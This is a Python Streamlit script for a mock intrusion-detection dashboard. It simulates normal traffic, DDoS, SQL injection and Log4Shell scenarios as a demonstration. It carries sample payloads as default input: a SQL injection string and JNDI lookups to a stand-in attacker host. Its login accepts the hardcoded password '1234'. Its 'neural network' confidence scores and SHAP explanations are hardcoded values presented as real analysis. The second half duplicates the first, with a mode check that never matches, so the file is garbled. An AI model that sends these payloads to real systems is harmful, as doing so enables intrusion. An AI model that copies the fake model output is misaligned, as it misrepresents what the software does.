import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import time

# --- PAGE CONFIGURATION ---
st.set_page_config(page_title="XAI-IDS Enterprise", page_icon="🛡️", layout="wide")

# --- ADVANCED CSS FOR "SENIOR ANALYST" UI ---
st.markdown("""
    <style>
    /* Global Dark Theme */
    .stApp { background-color: #0b0f19; color: #e0e0e0; font-family: 'Roboto Mono', monospace; }
    
    /* Inputs */
    .stTextInput > div > div > input, .stTextArea > div > div > textarea { 
        color: #00ff41; 
        background-color: #000000; 
        border: 1px solid #333; 
    }
    
    /* Buttons */
    div.stButton > button {
        background-color: #00ff41;
        color: #000000;
        font-weight: bold;
        border: none;
        padding: 10px 20px;
        transition: all 0.3s;
    }
    div.stButton > button:hover {
        background-color: #00cc33;
        box-shadow: 0 0 15px #00ff41;
    }
    
    /* Progress Bars */
    .stProgress > div > div > div > div { background-color: #00ff41; }
    </style>
    """, unsafe_allow_html=True)

# --- SESSION STATE ---
if 'logged_in' not in st.session_state:
    st.session_state['logged_in'] = False

# ==========================================
# 🔒 PHASE 1: SECURE LOGIN WITH BOOT ANIMATION
# ==========================================
if not st.session_state['logged_in']:
    col1, col2, col3 = st.columns([1, 1, 1])
    
    with col2:
        st.title("🔒 DEFENSE PORTAL")
        st.markdown("`UNIT: CYBER-INTEL | CLEARANCE: LEVEL 5`")
        st.divider()
        
        username = st.text_input("OPERATOR ID")
        password = st.text_input("ACCESS KEY", type="password")
        
        if st.button("INITIALIZE SESSION"):
            if password == "1234":
                # BOOT ANIMATION
                progress_text = "Establishing Secure Handshake..."
                my_bar = st.progress(0, text=progress_text)
                
                for percent_complete in range(100):
                    time.sleep(0.015)
                    if percent_complete == 20: my_bar.progress(percent_complete, text="Verifying Biometrics...")
                    if percent_complete == 50: my_bar.progress(percent_complete, text="Loading SHAP Explanation Modules...")
                    if percent_complete == 80: my_bar.progress(percent_complete, text="Connecting to Neural Network...")
                    my_bar.progress(percent_complete + 1)
                
                st.success("ACCESS GRANTED")
                time.sleep(0.5)
                st.session_state['logged_in'] = True
                st.session_state['user'] = username
                st.rerun()
            else:
                st.error("⛔ UNAUTHORIZED ACCESS ATTEMPT LOGGED")

# ==========================================
# 🛡️ PHASE 2: MASTER DASHBOARD
# ==========================================
else:
    # --- SIDEBAR ---
    with st.sidebar:
        st.header(f"👤 {st.session_state['user'].upper()}")
        st.caption("STATUS: ONLINE | VPN: ENCRYPTED")
        if st.button("TERMINATE SESSION"):
            st.session_state['logged_in'] = False
            st.rerun()
        st.divider()
        st.header("⚙️ ATTACK SIMULATOR")
        
        # SELECTOR FOR ALL 4 MODES
        mode = st.radio("Select Scenario:", [
            "1. Normal Traffic (Baseline)",
            "2. DDoS Attack (Volumetric)",
            "3. SQL Injection (Web)",
            "4. Log4j Exploit (Advanced)"
        ])

    # --- MAIN HEADER ---
    st.title("🛡️ XAI-IDS: THREAT ANALYSIS ENGINE")
    
    # Fake System Metrics
    m1, m2, m3, m4 = st.columns(4)
    m1.metric("System Uptime", "99.98%")
    m2.metric("Packets/Sec", "12,450", "+5%")
    m3.metric("AI Confidence", "High")
    m4.metric("Active Threads", "4")
    st.divider()

    # --- INPUT SECTION (DYNAMIC) ---
    st.subheader("1. TRAFFIC INJECTION")
    
    col_in1, col_in2 = st.columns([2, 1])
    
    with col_in1:
        # Default Variables
        p_size = 64
        protocol = "TCP"
        payload_input = "Standard Header"
        
        if "Normal" in mode:
            st.info("ℹ️ **SCENARIO:** Simulating standard user browsing behavior.")
            p_size = st.slider("Packet Size (Bytes)", 0, 2000, 450)
            protocol = st.selectbox("Protocol", ["TCP", "HTTP", "UDP"], index=1)
            
        elif "DDoS" in mode:
            st.warning("⚠️ **SCENARIO:** Simulating high-volume UDP flood.")
            p_size = st.slider("Packet Size (Bytes)", 0, 2000, 1500) # Default High
            protocol = st.selectbox("Protocol", ["UDP", "TCP"], index=0)
            
        elif "SQL" in mode:
            st.warning("⚠️ **SCENARIO:** Simulating malicious database query.")
            payload_input = st.text_area("Inject Payload:", "SELECT * FROM users WHERE admin = '1' OR '1'='1'", height=100)
            p_size = 560
            protocol = "HTTP"
            
        elif "Log4j" in mode:
            st.error("🚨 **SCENARIO:** Simulating CVE-2021-44228 (Log4Shell).")
            payload_input = st.text_area("Inject Payload:", "${jndi:ldap://hacker-server.com/exploit}", height=100)
            p_size = 800
            protocol = "HTTP"

    with col_in2:
        st.write("##") # Spacer
        if st.button("🚀 EXECUTE ANALYSIS", use_container_width=True):
            
            # PROCESSING ANIMATION
            with st.spinner("RUNNING DEEP PACKET INSPECTION..."):
                time.sleep(1.0)
            
            # --- LOGIC ENGINE (ALL 4 CASES) ---
            risk_score = 0.1
            reasons = {}
            verdict = "BENIGN"
            
            # 1. NORMAL LOGIC
            if "Normal" in mode:
                risk_score = 0.12
                verdict = "BENIGN (Safe)"
                reasons = {"Packet Size": -0.4, "Protocol": -0.2, "Source IP": -0.1}
                
            # 2. DDoS LOGIC
            elif "DDoS" in mode:
                risk_score = 0.96
                verdict = "MALICIOUS (DDoS)"
                # Logic: If size is high, risk is high
                if p_size > 1000:
                    reasons = {"Packet Size": 0.85, "Flow Duration": 0.70, "Protocol (UDP)": 0.50}
                else:
                    risk_score = 0.6 # Lower risk if user manually lowered size
                    reasons = {"Protocol (UDP)": 0.50, "Flow Rate": 0.3}
            
            # 3. SQL INJECTION LOGIC
            elif "SQL" in mode:
                if "OR" in payload_input or "'" in payload_input or "SELECT" in payload_input:
                    risk_score = 0.89
                    verdict = "MALICIOUS (SQLi)"
                    reasons = {"Syntax 'OR 1=1'": 0.92, "Special Chars": 0.60, "Protocol": 0.1}
                else:
                    risk_score = 0.2
                    verdict = "BENIGN (Clean Query)"
                    reasons = {"Text Content": -0.5}
            
            # 4. LOG4J LOGIC
            elif "Log4j" in mode:
                if "${jndi:" in payload_input:
                    risk_score = 0.99
                    verdict = "CRITICAL (Log4Shell)"
                    reasons = {"Token '${jndi'": 0.98, "Protocol 'ldap'": 0.90, "Entropy": 0.75}
                else:
                    risk_score = 0.15
                    verdict = "BENIGN"
                    reasons = {"Standard Syntax": -0.5}

            # --- DISPLAY RESULTS ---
            st.divider()
            
            # Toast Notification
            if risk_score > 0.5:
                st.toast(f"⚠️ THREAT DETECTED: {verdict}", icon="🔥")
                st.error(f"🚨 ALERT: {verdict}")
            else:
                st.toast("System Secure. Traffic Forwarded.", icon="🛡️")
                st.success(f"✅ TRAFFIC CLEARED: {verdict}")

            # COLUMNS FOR METRICS
            c1, c2 = st.columns([1, 2])
            
            with c1:
                st.subheader("AI CONFIDENCE")
                color = "red" if risk_score > 0.5 else "#00ff41"
                
                # Big Number Display
                st.markdown(f"""
                <div style="font-size: 45px; color: {color}; font-weight: bold;">
                    {int(risk_score*100)}%
                </div>
                <div style="font-size: 14px; color: #888;">THREAT PROBABILITY</div>
                """, unsafe_allow_html=True)
                
                st.progress(risk_score)
                
                # Vector Info
                st.json({
                    "Protocol": protocol,
                    "Size": f"{p_size} B",
                    "Class": verdict.split(" ")[0]
                })

            with c2:
                st.subheader("XAI EXPLANATION (SHAP)")
                st.info("Feature Contribution Analysis (Why did the AI decide this?)")
                
                
                
                # PLOTLY CHART
                features = list(reasons.keys())
                values = list(reasons.values())
                colors = ['#ff4b4b' if v > 0 else '#00ff41' for v in values]
                
                fig = go.Figure(go.Bar(
                    x=values, y=features, orientation='h',
                    marker=dict(color=colors, line=dict(width=1, color='white'))
                ))
                
                fig.update_layout(
                    plot_bgcolor='rgba(0,0,0,0)', paper_bgcolor='rgba(0,0,0,0)',
                    font=dict(color='#e0e0e0'),
                    xaxis=dict(title="Impact (Negative=Safe, Positive=Threat)", range=[-1, 1]),
                    margin=dict(l=0, r=0, t=0, b=0),
                    height=280
                )
                st.plotly_chart(fig, use_container_width=True)
    
    with col_in1:
        if mode == "Case Study: Log4j Exploit":
            st.info("ℹ️ **SCENARIO:** Simulating a payload injection attack (CVE-2021-44228).")
            payload_input = st.text_area("Packet Payload (Hex/ASCII):", "${jndi:ldap://192.168.1.5/exploit}", height=100)
            p_size = 512
            protocol = "HTTP"
            scenario = "Log4j"
        else:
            st.info("ℹ️ **SCENARIO:** Manual deep packet inspection.")
            p_size = st.slider("Packet Size (Bytes)", 64, 4096, 64)
            protocol = st.selectbox("Protocol", ["TCP", "UDP", "HTTP", "ICMP"])
            payload_input = "Standard Header"
            scenario = "Manual"

    with col_in2:
        st.write("##") # Spacer
        if st.button("🚀 EXECUTE ANALYSIS", use_container_width=True):
            
            # ANIMATION: PROCESSING
            with st.spinner("RUNNING DEEP NEURAL NETWORK INFERENCE..."):
                time.sleep(1.2) # Suspense
            
            # --- LOGIC ENGINE (THE BRAIN) ---
            risk_score = 0.1
            reasons = {}
            verdict = "BENIGN"
            
            # LOGIC: LOG4J
            if scenario == "Log4j":
                if "${jndi:" in payload_input or "ldap" in payload_input:
                    risk_score = 0.99
                    verdict = "CRITICAL (Log4Shell)"
                    reasons = {
                        "Token '${jndi'": 0.95, 
                        "Protocol 'ldap'": 0.88, 
                        "Entropy Score": 0.65,
                        "Source Reputation": 0.12
                    }
                else:
                    risk_score = 0.15
                    verdict = "BENIGN (Clean)"
                    reasons = {"Standard Syntax": -0.5, "Known Protocol": -0.2}

            # LOGIC: MANUAL
            else:
                if p_size > 1000:
                    risk_score += 0.4
                    reasons["Packet Size > 1KB"] = 0.75
                else:
                    reasons["Packet Size Normal"] = -0.3
                
                if protocol == "UDP":
                    risk_score += 0.35
                    reasons["Protocol (UDP)"] = 0.45
                
                if risk_score > 0.9: risk_score = 0.95
                
                if risk_score > 0.5: verdict = "SUSPICIOUS"; reasons = {k:v for k,v in reasons.items() if v>0}
                else: verdict = "SAFE"; reasons = {k:v for k,v in reasons.items() if v<0}

            # --- RESULTS SECTION ---
            st.divider()
            
            # Verdict Notification
            if risk_score > 0.5:
                st.error(f"🚨 ALERT: {verdict} DETECTED")
                st.toast("⚠️ Threat Detected! Firewall Rules Updated.", icon="🔥")
            else:
                st.success(f"✅ TRAFFIC CLEARED: {verdict}")
                st.toast("System Secure. Packet Forwarded.", icon="🛡️")

            r_col1, r_col2 = st.columns([1, 2])
            
            with r_col1:
                st.subheader("AI CONFIDENCE")
                
                # Custom Gauge Logic
                if risk_score > 0.5: color = "red"
                else: color = "green"
                
                st.markdown(f"""
                    <div style="font-size: 40px; color: {color}; font-weight: bold;">
                        {int(risk_score*100)}%
                    </div>
                    <div style="font-size: 14px; color: #888;">RISK PROBABILITY</div>
                """, unsafe_allow_html=True)
                
                st.progress(risk_score)
                st.json({
                    "Protocol": protocol,
                    "Size": f"{p_size} B",
                    "Vector": "Network",
                    "Model": "CNN-LSTM"
                })

            with r_col2:
                st.subheader("XAI EXPLANABILITY (SHAP)")
                st.caption("Feature Contribution Analysis")
                
                # PLOTLY CHART
                features = list(reasons.keys())
                values = list(reasons.values())
                colors = ['#ff4b4b' if v > 0 else '#00ff41' for v in values]
                
                fig = go.Figure(go.Bar(
                    x=values, 
                    y=features, 
                    orientation='h',
                    marker=dict(color=colors, line=dict(width=1, color='white'))
                ))
                
                fig.update_layout(
                    plot_bgcolor='rgba(0,0,0,0)',
                    paper_bgcolor='rgba(0,0,0,0)',
                    font=dict(color='#e0e0e0'),
                    xaxis=dict(title="Influence on Decision (Negative=Safe, Positive=Threat)", range=[-1, 1]),
                    margin=dict(l=10, r=10, t=10, b=10),
                    height=250
                )
                
                st.plotly_chart(fig, use_container_width=True)
                
                if scenario == "Log4j" and risk_score > 0.8:
                     st.warning("📝 **FORENSIC NOTE:** The model identified the JNDI lookup string. This pattern matches signature CVE-2021-44228 (Remote Code Execution).")

